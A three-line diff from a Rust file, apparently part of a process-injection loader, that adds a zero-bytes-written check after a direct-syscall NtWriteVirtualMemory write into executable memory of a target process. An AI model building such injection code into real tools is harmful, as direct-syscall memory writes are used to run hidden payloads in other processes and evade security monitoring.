@@ -57,7 +57,7 @@ fn run() -> BOOL {
 
         let mut bytes_written: usize = 0;
         status = syscall!("NtWriteVirtualMemory", h_proc, exec_mem, data.as_mut_ptr(), bytes_len, &mut bytes_written);
-        if status != 0 {
+        if status != 0 || bytes_written == 0 {
             return BOOL(0);
         }
 
